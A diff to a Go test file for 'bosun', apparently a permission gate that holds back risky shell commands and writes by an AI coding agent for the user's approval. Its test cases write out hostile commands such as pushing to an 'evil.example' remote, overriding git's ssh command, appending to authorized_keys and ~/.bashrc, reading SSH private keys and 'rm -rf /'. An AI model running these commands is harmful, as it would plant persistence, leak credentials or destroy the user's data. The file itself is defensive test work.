@@ -40,20 +40,26 @@ func testGate() gate {
 
 var (
 	none    = reservation{}
-	force   = reservation{"a force push", true}
-	deletes = reservation{"a push that deletes a ref", true}
-	every   = reservation{"a push of every branch", true}
-	mirror  = reservation{"a mirror push", true}
-	unknown = reservation{"a push to a URL or an unknown remote", true}
-	option  = reservation{"a push with an option bosun does not check", true}
+	force   = reservation{reason: "a force push", user: true}
+	deletes = reservation{reason: "a push that deletes a ref", user: true}
+	every   = reservation{reason: "a push of every branch", user: true}
+	mirror  = reservation{reason: "a mirror push", user: true}
+	unknown = reservation{reason: "a push to a URL or an unknown remote", user: true}
+	option  = reservation{reason: "a push with an option bosun does not check", user: true}
 	branch  = reservation{reason: "deleting a branch"}
 	unboxed = reservation{reason: "a command outside the sandbox"}
 	outside = reservation{reason: "a write outside the worktree"}
 )
 
+// bare is r without the rule and the match, which TestReservedRules checks.
+func bare(r reservation) reservation {
+	r.rule, r.match = "", ""
+	return r
+}
+
 // user is the reservation of a command outside the sandbox that only the user may allow, for the reason that completes "a command outside the sandbox that …".
 func user(why string) reservation {
-	return reservation{"a command outside the sandbox that " + why, true}
+	return reservation{reason: "a command outside the sandbox that " + why, user: true}
 }
 
 func TestReservedCommand(t *testing.T) {
@@ -182,11 +188,11 @@ func TestReservedCommand(t *testing.T) {
 		{"echo x >> ~/.bashrc", none},
 		{"sudo ls", none},
 	} {
-		if got := g.command(tc.cmd, []string{g.cwd}); got != tc.want {
+		if got := g.command(tc.cmd, []string{g.cwd}); bare(got) != tc.want {
 			t.Errorf("command(%q) = %+v, want %+v", tc.cmd, got, tc.want)
 		}
 		input, _ := json.Marshal(map[string]any{"command": tc.cmd})
-		if got := g.reserved("Bash", input); got != tc.want {
+		if got := g.reserved("Bash", input); bare(got) != tc.want {
 			t.Errorf("sandboxed %q: reserved = %+v, want %+v", tc.cmd, got, tc.want)
 		}
 	}
@@ -197,7 +203,7 @@ func TestReservedUnsandboxed(t *testing.T) {
 	var (
 		activates = user("activates a NixOS configuration")
 		sudo      = user("runs sudo")
-		changed   = reservation{"a push outside the sandbox from a repository whose hook pre-push changed", true}
+		changed   = reservation{reason: "a push outside the sandbox from a repository whose hook pre-push changed", user: true}
 	)
 	for _, tc := range []struct {
 		cmd  string
@@ -301,7 +307,7 @@ func TestReservedUnsandboxed(t *testing.T) {
 		{"cd /other && git push origin main", changed},
 		{"git add . && git -C /other push", changed},
 		{"bash -c 'cd /other && git push'", changed},
-		{"cd $DIR && git push", reservation{"a push outside the sandbox from a repository bosun cannot find", true}},
+		{"cd $DIR && git push", reservation{reason: "a push outside the sandbox from a repository bosun cannot find", user: true}},
 		{"git push --force origin main", force},
 		{"git push origin +main", force},
 		{"git push origin :old", deletes},
@@ -369,7 +375,7 @@ func TestReservedUnsandboxed(t *testing.T) {
 		{`python3 -c 'print(6 // 4)'`, unboxed},
 	} {
 		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
-		if got := g.reserved("Bash", input); got != tc.want {
+		if got := g.reserved("Bash", input); bare(got) != tc.want {
 			t.Errorf("unsandboxed %q: reserved = %+v, want %+v", tc.cmd, got, tc.want)
 		}
 	}
@@ -379,7 +385,7 @@ func TestReservedUnsandboxed(t *testing.T) {
 		{"command": "curl example.com", "allowed_domains": []string{"example.com"}},
 	} {
 		raw, _ := json.Marshal(input)
-		if got := g.reserved("Bash", raw); got != none {
+		if got := g.reserved("Bash", raw); bare(got) != none {
 			t.Errorf("sandboxed %v: reserved = %+v", input, got)
 		}
 	}
@@ -399,15 +405,15 @@ func TestReservedUnsandboxedPaths(t *testing.T) {
 		{`echo x >> "$HOME"/'.bashrc'`, names + shellStartup},
 		{"echo x >>~/.zshenv", names + shellStartup},
 		{"echo x | tee -a /home/u/.bash_profile", names + shellStartup},
-		{"cat ~/.{zshrc,bashrc}", names + shellStartup},
-		{"cat ~/.bash*", names + shellStartup},
-		{"cat ~/.zsh?nv", names + shellStartup},
-		{"cd ~ && echo x >> .bashrc", holder + claudeConfig},
+		{"echo x | tee ~/.{zshrc,bashrc}", names + shellStartup},
+		{"rm ~/.bash*", names + shellStartup},
+		{"touch ~/.zsh?nv", names + shellStartup},
+		{"cd ~ && echo x >> .bashrc", names + shellStartup},
 		{"cd /tmp; echo x >> ../home/u/.profile", names + shellStartup},
 		{"echo x >> $ZDOTDIR/.zshrc", names + shellStartup},
 		{"echo x >> ~root/.bashrc", names + shellStartup},
 		{`python3 -c 'open("/home/u/.bashrc", "a").write("x")'`, names + shellStartup},
-		{"cp ~/.config/fish/config.fish /tmp", names + shellStartup},
+		{"cp /tmp/config.fish ~/.config/fish/", names + shellStartup},
 		{"cat > /home/u/.ssh/authorized_keys", names + credentials},
 		{"cp k ~/.ssh/", names + credentials},
 		{"ls ~/.ss?", names + credentials},
@@ -430,26 +436,26 @@ func TestReservedUnsandboxedPaths(t *testing.T) {
 		{"cp hook.sh /repo/.git/hooks/pre-commit", names + gitConfig},
 		{"echo x >> .git/config", names + gitConfig},
 		{"echo 'gitdir: /tmp/x' > .git", names + gitConfig},
-		{"cat /repo/.git/worktrees/a/config.worktree", names + gitConfig},
+		{"echo x >> /repo/.git/worktrees/a/config.worktree", names + gitConfig},
 		{"git config --file ~/.gitconfig user.name x", names + gitConfig},
 		{"cp x ~/.config/git/config", names + gitConfig},
 		{"cp x.service ~/.config/systemd/user/", names + unitFile},
 		{"cp x.service $XDG_CONFIG_HOME/systemd/user/", names + unitFile},
 		{"cp x.service $CONF/systemd/user/", names + unitFile},
-		{"cd ~/.config && rm -rf systemd", holder + credentials},
+		{"cd ~/.config && rm -rf systemd", names + unitFile},
 		{"cd $XDG_CONFIG_HOME/systemd && rm -rf user", names + unitFile},
 		{"cd ~/.config/systemd; rm -rf *", names + unitFile},
 		{"ln -s /tmp/x ~/.local/share/systemd/user/x.service", names + unitFile},
 		{"cp x.desktop /home/u/.config/autostart/", names + unitFile},
 		{"cp x.service /etc/systemd/system/", names + unitFile},
 		{"rm -rf ~/.local/state/bosun/repos", names + bosunState},
-		{"cat " + home + "/.local/state/bosun/nodes/a/settings.json", names + bosunState},
-		{"cp x " + home + "/.local/state/bosun/nodes/a/tmp/x", names + bosunState},
+		{"echo {} > " + home + "/.local/state/bosun/nodes/a/settings.json", names + bosunState},
+		{"cp /tmp/m.json " + home + "/.local/state/bosun/nodes/a/mcp.json", names + bosunState},
 		{"rm -rf ~/.config", holder + credentials},
 		{"tar xf x.tar -C ~", holder + claudeConfig},
 		{"cd && tar xf /tmp/x.tar", "runs in a folder that holds " + claudeConfig},
-		{"ls /", holder + claudeConfig},
-		{"cd / && ls", holder + claudeConfig},
+		{"cp /tmp/x ~/.claude/settings.json", names + claudeConfig},
+		{"sed -i s/a/b/ ~/.claude/settings.json", names + claudeConfig},
 		{"rm -rf /", holder + claudeConfig},
 		{"rm -rf //", holder + claudeConfig},
 		{`rm -rf "/"`, holder + claudeConfig},
@@ -476,16 +482,162 @@ func TestReservedUnsandboxedPaths(t *testing.T) {
 		{"git push origin ~:main", holder + claudeConfig},
 	} {
 		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
-		if got, want := g.reserved("Bash", input), user(tc.why); got != want {
+		if got, want := g.reserved("Bash", input), user(tc.why); bare(got) != want {
 			t.Errorf("unsandboxed %q: reserved = %+v, want %+v", tc.cmd, got, want)
 		}
 	}
 
-	// A command that runs in a folder on the list stays with the user whatever it names.
-	g.cwd = home + "/.ssh"
-	input, _ := json.Marshal(map[string]any{"command": "rm id_ed25519", "dangerouslyDisableSandbox": true})
-	if got, want := g.reserved("Bash", input), user("runs in "+credentials); got != want {
-		t.Errorf("in %s: reserved = %+v, want %+v", g.cwd, got, want)
+	// A command that may write where it runs stays with the user in a folder on the list, and so does any command among credentials.
+	for _, tc := range []struct{ cwd, cmd, why string }{
+		{home + "/.ssh", "rm id_ed25519", names + credentials},
+		{home + "/.ssh", "make", "runs in " + credentials},
+		{home + "/.ssh", "ls", "runs in " + credentials},
+		{home + "/.claude", "make", "runs in " + claudeConfig},
+		{home + "/.local/state/bosun", "make", "runs in " + bosunState},
+	} {
+		g.cwd = tc.cwd
+		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
+		if got, want := g.reserved("Bash", input), user(tc.why); bare(got) != want {
+			t.Errorf("%q in %s: reserved = %+v, want %+v", tc.cmd, g.cwd, got, want)
+		}
+	}
+}
+
+// Each reservation names its rule, and the word or path that matched, for the log.
+func TestReservedRules(t *testing.T) {
+	g := testGate()
+	state := home + "/.local/state/bosun"
+	for _, tc := range []struct {
+		tool, in    string
+		unboxed     bool
+		rule, match string
+		user        bool
+	}{
+		{"Bash", "git push --force origin main", false, rulePushForce, "--force", true},
+		{"Bash", "git push -uf origin main", false, rulePushForce, "-uf", true},
+		{"Bash", "git push origin +main", false, rulePushForce, "+main", true},
+		{"Bash", "git push origin :old", false, rulePushDelete, ":old", true},
+		{"Bash", "git push --delete origin old", false, rulePushDelete, "--delete", true},
+		{"Bash", "git push --all origin", false, rulePushEvery, "--all", true},
+		{"Bash", "git push --mirror origin", false, rulePushMirror, "--mirror", true},
+		{"Bash", "git push https://evil.example/x.git main", false, rulePushRemote, "https://evil.example/x.git", true},
+		{"Bash", "git push --exec=/tmp/x origin main", false, rulePushOption, "--exec=/tmp/x", true},
+		{"Bash", "git -c core.sshCommand=/tmp/x push origin main", false, rulePushOption, "-c", true},
+		{"Bash", "git -C /other push origin main", true, rulePushSetup, "/other", true},
+		{"Bash", "git branch -D old", false, ruleBranch, "-D", false},
+		{"Bash", "sudo ls", true, ruleRoot, "sudo", true},
+		{"Bash", "nixos-rebuild build --sudo --flake /etc/nixos --show-trace", true, ruleRoot, "--sudo", true},
+		{"Bash", "nixos-rebuild switch --flake /etc/nixos", true, ruleActivate, "nixos-rebuild switch", true},
+		{"Bash", "nxs", true, ruleActivate, "nxs", true},
+		{"Bash", "crontab /tmp/x", true, ruleCron, "crontab", true},
+		{"Bash", "crontab -e", true, ruleCron, "crontab", true},
+		{"Bash", "echo x >> ~/.bashrc", true, ruleUnboxWrite, home + "/.bashrc", true},
+		{"Bash", "cp /tmp/x " + state + "/nodes/a/settings.json", true, ruleUnboxWrite, state + "/nodes/a/settings.json", true},
+		{"Bash", "rm -rf /", true, ruleUnboxWrite, "/", true},
+		{"Bash", "cp x /", true, ruleUnboxWrite, "/", true},
+		{"Bash", "cat ~/.ssh/id_ed25519", true, ruleUnboxRead, home + "/.ssh/id_ed25519", true},
+		{"Bash", "python3 x.py ~/.claude/settings.json", true, ruleUnboxNames, home + "/.claude/settings.json", true},
+		{"Bash", "tar xf x.tar -C ~", true, ruleUnboxNames, home, true},
+		{"Bash", "cd ~ && make", true, ruleUnboxRunsIn, home, true},
+		{"Bash", "ls -la", true, ruleUnboxed, "ls", false},
+		{"Bash", "bosun status --json | jq .", true, ruleUnboxed, "bosun", false},
+		{"Write", home + "/.claude/settings.json", false, ruleWriteList, home + "/.claude/settings.json", true},
+		{"Write", state + "/nodes/a/mcp.json", false, ruleWriteList, state + "/nodes/a/mcp.json", true},
+		{"Write", "/tmp/x", false, ruleWriteOut, "/tmp/x", false},
+		{"Write", state + "/nodes/b/tmp/claude-1000/x", false, ruleWriteOut, state + "/nodes/b/tmp/claude-1000/x", false},
+	} {
+		var input []byte
+		if tc.tool == "Bash" {
+			input, _ = json.Marshal(map[string]any{"command": tc.in, "dangerouslyDisableSandbox": tc.unboxed})
+		} else {
+			input, _ = json.Marshal(map[string]any{"file_path": tc.in})
+		}
+		got := g.reserved(tc.tool, input)
+		if got.rule != tc.rule || got.match != tc.match || got.user != tc.user {
+			t.Errorf("%s %q: reserved = %+v, want rule %s on %q, user %v", tc.tool, tc.in, got, tc.rule, tc.match, tc.user)
+		}
+	}
+	g.fenced = []string{"/wt/desk"}
+	input, _ := json.Marshal(map[string]any{"file_path": "/wt/desk/.claude/settings.json"})
+	if got := g.reserved("Write", input); got.rule != ruleWriteDesk || got.match != "/wt/desk/.claude/settings.json" {
+		t.Errorf("Write into the desk: reserved = %+v", got)
+	}
+}
+
+// What only reads the user's list, other than a credential, goes to the master, as does a scratch folder and running bosun (egor/bosun#62, #63, #72).
+func TestReservedUnsandboxedReads(t *testing.T) {
+	g := testGate()
+	state := home + "/.local/state/bosun"
+	other := state + "/nodes/visual-check/tmp/claude-1000"
+	for _, cmd := range []string{
+		// The calls #62 found reaching the user.
+		`bosun status --json | jq -r '.sessions[] | select(.node == "visual-check") | .status // "gone"'`,
+		`bosun conversation visual-check | jq -r '.entries[-1].text // ""'`,
+		`bosun say visual-check "look at ~/.claude/settings.json again" | jq .`,
+		state + "/bosun status --json",
+		state + `/bosun status --json | jq '.decisions[] | select(.userOnly) // empty'`,
+		"~/.local/state/bosun/bosun conversation desk --json | jq -c '.entries[]' | tail -5",
+		"cp " + other + "/index.html ~/Pictures/Screenshots/",
+		"cp ~/.local/state/bosun/nodes/visual-check/tmp/claude-1000/index.html ~/Pictures/Screenshots/",
+		// Reading bosun's state.
+		"cat " + state + "/log.jsonl",
+		"tail -n 50 ~/.local/state/bosun/log.jsonl | jq -c 'select(.kind == \"settled\")'",
+		"jq '.sessions' ~/.local/state/bosun/state.json",
+		`jq -r '.decision.reserved // "none"' ~/.local/state/bosun/log.jsonl`,
+		"grep -c settled " + state + "/log.jsonl",
+		"head -c 600 $HOME/.local/state/bosun/state.json",
+		"ls -la ~/.local/state/bosun ~/.local/state/bosun/nodes/a",
+		"cat " + state + "/nodes/a/settings.json",
+		"wc -l ~/.local/state/bosun/nodes/*/mcp.json",
+		"cd ~/.local/state/bosun && cat log.jsonl | tail -3",
+		"cd ~/.local/state/bosun && jq . state.json",
+		"diff ~/.local/state/bosun/nodes/a/settings.json ~/.local/state/bosun/nodes/b/settings.json",
+		"find ~/.local/state/bosun -name '*.json'",
+		"stat ~/.local/state/bosun/bosun",
+		"readlink -f ~/.local/state/bosun/bosun",
+		"timeout 5 cat ~/.local/state/bosun/log.jsonl",
+		"FOO=1 cat ~/.local/state/bosun/log.jsonl",
+		"jq . < ~/.local/state/bosun/state.json",
+		// Reading Claude Code's configuration and the rest of the list.
+		"cat ~/.claude/settings.json",
+		"jq '.hooks' ~/.claude/settings.json",
+		"ls ~/.claude/skills ~/.claude/plugins",
+		"grep -rn Stop ~/.claude/hooks",
+		"cat /repo/.claude/settings.json",
+		"cat ~/.{zshrc,bashrc}",
+		"cat ~/.bash*",
+		"cat ~/.zsh?nv",
+		"cp ~/.config/fish/config.fish /tmp",
+		"cat /repo/.git/worktrees/a/config.worktree",
+		"cat ~/.gitconfig",
+		"ls ~/.config/systemd/user",
+		"ls /",
+		"cd / && ls",
+		"du -sh ~",
+		"echo ~/.claude/settings.json",
+		// Scratch folders, whoever's, and a claude-<uid> folder anywhere.
+		"cp x " + state + "/nodes/a/tmp/x",
+		"rm -rf " + state + "/nodes/b/tmp/claude-1000/build",
+		"echo x > " + state + "/nodes/b/tmp/claude-1000/out.txt",
+		"some-tool --out " + state + "/nodes/b/tmp/claude-1000/a.png",
+		"mkdir -p /tmp/claude-1000/x && cp a /tmp/claude-1000/x/",
+		"rm -rf /home/u/build/claude-1000",
+		// jq, sed and awk programs.
+		`jq -r '.a // "b"'`,
+		`echo "$(jq -r '.a // "b"' x.json)"`,
+		`[ "$(hyprctl -j activewindow | jq -r '.address // "none"')" = none ]`,
+		"sed 's/x//' f",
+		"sed -e 's|a||' f",
+		`awk '{sub(/x/, "")}' f`,
+		// Rebuilds the allowlist takes, with a suffix.
+		"nixos-rebuild test --sudo --flake /etc/nixos | tail -15",
+		"nixos-rebuild test --sudo --flake /etc/nixos 2>&1",
+		"nixos-rebuild test --sudo --flake /etc/nixos 2>&1 | tail -15",
+	} {
+		input, _ := json.Marshal(map[string]any{"command": cmd, "dangerouslyDisableSandbox": true})
+		if got := g.reserved("Bash", input); bare(got) != unboxed {
+			t.Errorf("unsandboxed %q: reserved = %+v, want the master's", cmd, got)
+		}
 	}
 }
 
@@ -501,7 +653,7 @@ func TestUserListFollowsXDG(t *testing.T) {
 		{"cp x ~/.config/systemd/user/x.service", unitFile},
 	} {
 		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
-		if got, want := g.reserved("Bash", input), user("names "+tc.why); got != want {
+		if got, want := g.reserved("Bash", input), user("names "+tc.why); bare(got) != want {
 			t.Errorf("unsandboxed %q: reserved = %+v, want %+v", tc.cmd, got, want)
 		}
 	}
@@ -526,7 +678,7 @@ func TestRebuildsMeetAskRules(t *testing.T) {
 func TestReservedWrite(t *testing.T) {
 	const wt = "/repo/.claude/worktrees/a"
 	g := gate{cwd: wt, writable: []string{wt, scratch, memory, job}, list: testList(noEnv)}
-	to := func(what string) reservation { return reservation{"a write to " + what, true} }
+	to := func(what string) reservation { return reservation{reason: "a write to " + what, user: true} }
 	for _, tc := range []struct {
 		tool, path string
 		want       reservation
@@ -595,12 +747,12 @@ func TestReservedWrite(t *testing.T) {
 		{"Write", home + "/.local/state/bosun/bosun", to(bosunState)},
 	} {
 		input, _ := json.Marshal(map[string]string{"file_path": tc.path})
-		if got := g.reserved(tc.tool, input); got != tc.want {
+		if got := g.reserved(tc.tool, input); bare(got) != tc.want {
 			t.Errorf("%s %s: reserved = %+v, want %+v", tc.tool, tc.path, got, tc.want)
 		}
 	}
 	input, _ := json.Marshal(map[string]string{"notebook_path": "/tmp/n.ipynb"})
-	if got := g.reserved("NotebookEdit", input); got != outside {
+	if got := g.reserved("NotebookEdit", input); bare(got) != outside {
 		t.Errorf("NotebookEdit outside the worktree: reserved = %+v", got)
 	}
 }
@@ -635,21 +787,21 @@ func TestReservedWriteThroughSymlink(t *testing.T) {
 		path string
 		want reservation
 	}{
-		{filepath.Join(wt, "rc"), reservation{"a write to " + shellStartup, true}},
-		{filepath.Join(wt, "keys", "authorized_keys"), reservation{"a write to " + credentials, true}},
-		{filepath.Join(wt, "up", ".profile"), reservation{"a write to " + shellStartup, true}},
+		{filepath.Join(wt, "rc"), reservation{reason: "a write to " + shellStartup, user: true}},
+		{filepath.Join(wt, "keys", "authorized_keys"), reservation{reason: "a write to " + credentials, user: true}},
+		{filepath.Join(wt, "up", ".profile"), reservation{reason: "a write to " + shellStartup, user: true}},
 		{filepath.Join(wt, "tmp", "x"), outside},
 		{filepath.Join(wt, "self", "x.go"), none},
 		{filepath.Join(wt, "x.go"), none},
 	} {
 		input, _ := json.Marshal(map[string]string{"file_path": tc.path})
-		if got := g.reserved("Write", input); got != tc.want {
+		if got := g.reserved("Write", input); bare(got) != tc.want {
 			t.Errorf("Write %s: reserved = %+v, want %+v", tc.path, got, tc.want)
 		}
 	}
 	g.writable = []string{via}
 	input, _ := json.Marshal(map[string]string{"file_path": filepath.Join(via, "x.go")})
-	if got := g.reserved("Write", input); got != none {
+	if got := g.reserved("Write", input); bare(got) != none {
 		t.Errorf("Write in a worktree behind a link: reserved = %+v", got)
 	}
 }
@@ -663,20 +815,20 @@ func TestSimpleCommandsRedirections(t *testing.T) {
 		{"nxt 2>&1 | tail -15", []simple{{argv: []string{"nxt"}}, {argv: []string{"tail", "-15"}}}},
 		{"a >&2", []simple{{argv: []string{"a"}}}},
 		{"a 2>&-", []simple{{argv: []string{"a"}}}},
-		{"a > log 2>/dev/null", []simple{{argv: []string{"a"}, files: []string{"log", "/dev/null"}}}},
-		{"a &>> log b", []simple{{argv: []string{"a", "b"}, files: []string{"log"}}}},
-		{"a >|log", []simple{{argv: []string{"a"}, files: []string{"log"}}}},
-		{"a >&log", []simple{{argv: []string{"a"}, files: []string{"log"}}}},
-		{"a <<<'x y'", []simple{{argv: []string{"a"}, files: []string{"x y"}}}},
-		{"a2>x", []simple{{argv: []string{"a2"}, files: []string{"x"}}}},
-		{"> x", []simple{{files: []string{"x"}}}},
+		{"a > log 2>/dev/null", []simple{{argv: []string{"a"}, files: []redirect{{"log", writes}, {"/dev/null", writes}}}}},
+		{"a &>> log b", []simple{{argv: []string{"a", "b"}, files: []redirect{{"log", writes}}}}},
+		{"a >|log", []simple{{argv: []string{"a"}, files: []redirect{{"log", writes}}}}},
+		{"a >&log", []simple{{argv: []string{"a"}, files: []redirect{{"log", writes}}}}},
+		{"a <<<'x y'", []simple{{argv: []string{"a"}, files: []redirect{{"x y", reads}}}}},
+		{"a2>x", []simple{{argv: []string{"a2"}, files: []redirect{{"x", writes}}}}},
+		{"> x", []simple{{files: []redirect{{"x", writes}}}}},
 		{"a & b", []simple{{argv: []string{"a"}}, {argv: []string{"b"}}}},
 		{"diff <(sudo x) y", []simple{{argv: []string{"diff"}}, {argv: []string{"sudo", "x"}}, {argv: []string{"y"}}}},
 	} {
 		if got := simpleCommands(tc.script); !slices.EqualFunc(got, tc.want, func(a, b simple) bool {
 			return slices.Equal(a.argv, b.argv) && slices.Equal(a.files, b.files)
 		}) {
-			t.Errorf("simpleCommands(%q) = %q, want %q", tc.script, got, tc.want)
+			t.Errorf("simpleCommands(%q) = %v, want %v", tc.script, got, tc.want)
 		}
 	}
 }
